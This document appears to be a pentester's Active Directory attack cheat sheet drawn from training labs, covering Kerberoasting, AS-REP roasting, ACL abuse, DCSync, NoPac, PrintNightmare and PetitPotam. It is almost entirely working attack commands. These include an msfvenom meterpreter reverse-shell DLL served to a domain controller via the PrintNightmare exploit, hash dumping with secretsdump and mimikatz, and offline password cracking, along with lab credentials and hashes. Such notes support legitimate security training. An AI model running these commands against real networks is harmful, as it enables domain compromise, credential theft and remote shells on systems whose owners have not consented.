
# Kerberoasting - from Linux
## Prerequisite:
- Domain User Credentials (cleartext or NTLM hash)
- Shell in context of a domain user such as SYSTEM
- We must know which host in the domain is a Domain Controller so we can query it
## Listing SPN Accounts with GetUserSPNs.py
```
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
## Requesting all TGS Tickets
```
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
## Requesting a Single TGS ticket (for user sqldev)
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
## Saving the TGS Ticket to an Output File
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
## Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
### Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
# Credentialed Enumeration - from Linux
## CrackMapExec
### Domain User Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
### Domain Group Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
### Logged On Users
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
### Share Searching
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
try a RID cycling attack, by bruteforcing Windows user security identifiers (SIDs) by incrementing the relative identifier (RID) part. The Impacket script loopupside.py will do this nicely:
```
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```
```
lookupsid.py 0xdf@manager.htb -no-pass
```
```
oxdf@hacky$ lookupsid.py 0xdf@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users
```

### Spider_plus run against a specific share
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares’
```
```
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```
### Password Spraying without bruteforce
```
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce
```
```
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce
```
## SMBMap
### Check Access
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
**CASE SENSITIVE FOR DOMAIN**
### Recursive List Of All Directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
## rpcclient
```
rpcclient -U "" -N 172.16.5.5
```
### User Enumeration By RID
```
enumdomusers
```
```
queryuser <RID>
```
## Impacket
### Psexec.py
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
### wmiexec.py
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
### Get-UserSPNs
```
impacket-GetUserSPNs -dc-ip 10.10.10.100 ACTIVE.HTB/svc_tgs -request
```
## Windapsearch 
#### Domain Admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
#### Privileged Users
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
## ASREPRoasting
### Linux
```
root@kali:~# GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.175
```
We could get a list of the users from the website or from enum4linux
#### Cracking the Hash Offline with Hashcat
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
you can add -format hashcat to the above command
## ldapsearch
If you have valid credentials you can use ldapdomaindump to get the info 
```
oxdf@hacky$ ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ldap/
```
The user and password is operator in the above example
## You can run bloodhound-python if nothing works 
```
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```
# Credentialed Enumeration - from Windows
## Get-Module
```
Import-Module ActiveDirectory
```
## ActiveDirectory PowerShell module
### Get Domain Info
This will print out helpful information like the domain SID, domain functional level, any child domains
```
PS C:\htb> Get-ADDomain
```
### get a listing of accounts that may be susceptible to a Kerberoasting attack
```
Get-ADUser
```
filtering for accounts with the ServicePrincipalName
```
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### Checking For Trust Relationships
```
PS C:\htb> Get-ADTrust -Filter *
```
### Group Enumeration
```
PS C:\htb> Get-ADGroup -Filter * | select name
```
We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:
#### Detailed Group Info
```
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
#### Group Membership
```
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```
## PowerView
### Domain User Information (mmorgan example)
PS C:\htb> Get-DomainUser -Identity sflowers -Domain outdated.htb | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
### Recursive Group Membership
enumerate some domain group information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. 
```
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
### Trust Enumeration
```
PS C:\htb> Get-DomainTrustMapping
```
### Testing for Local Admin Access
```
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
### Finding Users With SPN Set
indicates that the account may be subjected to a Kerberoasting attack.
```
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
## SharpView
### enumerate information about a specific user (forend example)
```
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```
## Snaffler
### Snaffler Execution
```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.
**Exremely Important for retreiving passwords**
## SharpHound
```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```
1. exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI
2. click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.
3. we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it Excessive Active Directory Group Privileges and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.
# Kerberoasting - from Windows
## Enumerating SPNs with setspn.exe
```
C:\> setspn.exe -Q */*
```
### using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory
#### Targeting a Single User
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
```
```
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
#### Retrieving All Tickets Using setspn.exe
```
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q / | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
#### tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory
##### base64 /out:true

take the base64 blob and remove new lines and white spaces since the output is column wrapped
Preparing the Base64 Blob for Cracking
```
echo "<base64 blob>" |  tr -d \\n
```
Placing the Output into a File as .kirbi
```
cat encoded_file | base64 -d > sqldev.kirbi
```
Extracting the Kerberos Ticket using kirbi2john.py
```
python2.7 kirbi2john.py sqldev.kirbi
```
This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
```
sed 's/\$krb5tgs\$\(.\):\(.\)/\$krb5tgs\$23\$\\1\\$\2/' crack_file > sqldev_tgs_hashcat
```
Viewing the Prepared Hash
```
cat sqldev_tgs_hashcat
```
Cracking the Hash with Hashcat
```
-m 13100
```
##### kerberos::list /export
the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.
```
python2.7 kirbi2john.py sqldev.kirbi
```
This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
```
sed 's/\$krb5tgs\$\(.\):\(.\)/\$krb5tgs\$23\$\\1\\$\2/' crack_file > sqldev_tgs_hashcat
```
Viewing the Prepared Hash
```
cat sqldev_tgs_hashcat
```
Cracking the Hash with Hashcat
```
-m 13100
```
## Automated / Tool Based Route
```
Import-Module .\PowerView.ps1
```
```
Get-DomainUser * -spn | select samaccountname
```
### Using PowerView to Target a Specific User
```
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
Exporting All Tickets to a CSV File
```
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
Viewing the Contents of the .CSV File
```
PS C:\htb> cat .\ilfreight_tgs.csv
```
hashcat to crack
```
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```
We can still note down another finding for Weak Kerberos Authentication Configuration (Kerberoasting) and move on.
## Using Rubeus
```
https://github.com/GhostPack/Rubeus
```
```
PS C:\htb> .\Rubeus.exe
```
request tickets for accounts with the admincount attribute set to 1,  specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. 
Using the /nowrap Flag
```
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
```
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
```
### Running Rubeus to get only RC4 encryption type with flag /tgtdeleg RC4 (type 23) encrypted ticket ($krb5tgs$23$) or AES 128/256 encryption tickets ($krb5tgs$17$) or ($krb5tgs$18$)
#### Cracking the Ticket with Hashcat & rockyou.txt for RC4 type 23
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```
Dont forget to modify the hash file be on the same line
#### Running Hashcat for type 17 or type 18
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
## Checking Supported Encryption Types
```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
### RC4 (type 23) encrypted ticket ($krb5tgs$23$)
#### Cracking the Ticket with Hashcat & rockyou.txt
```
d0x777@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```
If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
### AES 128/256 encryption tickets ($krb5tgs$17$) or ($krb5tgs$18$)
Requesting a New Ticket
```
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
```
# Access Control List (ACL)
## ACL Enumeration
### Enumerating ACLs with PowerView
```
$sid = Convert-NameToSid wley
```
Using the -ResolveGUIDs Flag for readable format
```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
### Creating a List of Domain Users
```
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
A Useful foreach Loop
```
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
Performing a Reverse Search & Mapping to a GUID Value
```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
```
```
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
```
https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password
```
## GenericAll or GenericWrite privilege
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
```
Add a user to the Exchange Windows Permissons Group 
```
PS C:\> net group "Exchange Windows Permissions" /add <user>
```
### WriteDacl
```
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PincipalIndentity <useraddedtogroupwithWriteDaclprivleges> DCSync
```
# DCSync
If we have a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set.  Domain/Enterprise Admins and default domain administrators have this right by default.
```
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
Using Get-ObjectAcl to Check adunn's Replication Rights
```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
```
```
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. 
## Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
```
d0x777@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```
**ip for the DC**
## Viewing an Account with Reversible Encryption Password Storage Set
```
Import-Module .\PowerView.ps1
```
```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
### Displaying the Decrypted Password
```
cat inlanefreight_hashes.ntds.cleartext
```
### Using runas.exe
```
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
```
Then run mimikatz as the user proxyagent who has can perform the DCSynce attack
```
PS C:\htb> .\mimikatz.exe
```
```
mimikatz # privilege::debug
```
As for the user khartsfield, we can get the NTLM hash using the following command
```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
```
# Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
## RDP
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users”
```
We can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.
We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP
```
xfreerdp or Remmina from our VM 
```
```
mstsc.exe if attacking from a Windows host
```
## WinRM
### Enumerating the Remote Management Users Group
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
Custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
### Establishing WinRM Session
#### Windows
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
```
```
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
```
```
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
#### Linux
```
gem install evil-winrm
```
```
evil-winrm -i 10.129.201.234 -u forend
```
## SQL Server Admin
We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
### Windows
We can use our ACL rights to authenticate with the wley user, change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL
#### Enumerating MSSQL Instances with PowerUpSQL
```
Import-Module .\PowerUpSQL.ps1
```
```
Get-SQLInstanceDomain
```
```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version’
```
### Linux
Running mssqlclient.py Against the Target
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
```
enable_xp_cmdshell 
```
Enumerating our Rights on the System using xp_cmdshell
```
xp_cmdshell whoami /priv
```
# NoPac (SamAccountName Spoofing)
```
git clone https://github.com/Ridter/noPac.git
```
We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. 
## Scanning for NoPac
```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
```
ms-DS-MachineAccountQuota number is set to 10
```
## Running NoPac & Getting a Shell
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
## Using noPac to DCSync the Built-in Administrator Account
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
# PrintNightmare
```
git clone https://github.com/cube0x0/CVE-2021-1675.git
```
## Install cube0x0's Version of Impacket
```
pip3 uninstall impacket
```
```
git clone https://github.com/cube0x0/impacket
```
```
cd impacket
```
```
python3 ./setup.py install
```
### Enumerating for MS-RPRN to check if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target
```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
#### Creating a Share with smbserver.py
```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
#### Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target
```
use exploit/multi/handler
```
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
```
set LHOST 172.16.5.225
```
```
set LPORT 8080
```
```
run
```
#### Running the Exploit
```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
The payload will then call back to our multi handler giving us an elevated SYSTEM shell
# PetitPotam (MS-EFSRPC)
we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as certi to attempt to locate it. https://github.com/zer1t0/certi
```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
## Linux
```
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
```
```
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
## Windows
### Mimikatz
```
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
```
### PowerShell 
```
Invoke-PetitPotam.ps1
```
```
https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1
```
### Requesting TGT and Performing PTT with DC01$ Machine Account
```
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
We can then type klist to confirm that the ticket is in memory.
#### Performing DCSync with Mimikatz
```
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```
## successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
### Requesting a TGT Using gettgtpkinit.py
```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
The TGT requested was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```
export KRB5CCNAME=dc01.ccache
```
We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
#### Running klist
```
Ticket cache: FILE:dc01.ccache
```
Confirming Admin Access to the Domain Controller
```
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
### INFO 
```
INFO:minikerberos :<key>
```
### Submitting a TGS Request for Ourselves Using getnthash.py
```
python /opt/PKINITtools/getnthash.py -key <key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
We can then use this hash to perform a DCSync with secretsdump.py using the -hashes flag.
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
# Miscellaneous Misconfigurations
## Printer Bug
### Enumerating for MS-PRN Printer Bug
```
Import-Module .\SecurityAssessment.ps1
```
```
https://github.com/NotMedic/NetNTLMtoSilverTicket
```
```
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
## MS14-068
### Enumerating DNS Records
```
https://github.com/dirkjanm/adidnsdump
```
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
Viewing the Contents of the records.csv File
```
head records.csv
```
If we run again with the -r flag the tool will attempt to resolve unknown records by performing an A query
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
## Password in Description Field
### Finding Passwords in the Description Field using Get-Domain User
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
### Credentials in SMB Shares and SYSVOL Scripts
```
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
```
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```
## Group Policy Preferences (GPP) Passwords
### Windows
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```
### Linux
```
crackmapexec smb -L | grep gpp
```
```
gpp_autologin
```
```
gpp_password
```
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
## ASREPRoasting
### Windows
Viewing an Account with the Do not Require Kerberos Preauthentication Option
```
Active Directory users and computers => Corp => Server Admins => user properties => Account => Do not require Kerberos preauthentication
```
### PowerView
#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
#### Retrieving AS-REP in Proper Format using Rubeus
```
.\Rubeus.exe asreproast /user:<samaccountname> /nowrap /format:hashcat
```
#### Cracking the Hash Offline with Hashcat
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
### Linux
```
root@kali:~# GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.175
```
We could get a list of the users from the website or from enum4linux
#### Cracking the Hash Offline with Hashcat
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
# Group Policy Object (GPO) Abuse
## Windows
### PowerView
Enumerating GPO Names
```
Get-DomainGPO |select displayname
```
autologon is in use which may mean there is a readable password in a GPO
### Enumerating GPO Names with a Built-In Cmdlet
```
Get-GPO -All | Select DisplayName
```
#### Enumerating Domain User GPO Rights
```
$sid=Convert-NameToSid "Domain Users"
```
```
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
##### Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl
###### Converting GPO GUID to Name
```
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
###### BloodHound => Domain Users group has several rights over the Disconnect Idle RDP
If we select the GPO in BloodHound and scroll down to Affected Objects on the Node Info tab, we can see that this GPO is applied to one OU, which contains four computer objects.
###### Linux
Use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell
```
https://github.com/FSecureLABS/SharpGPOAbuse
```
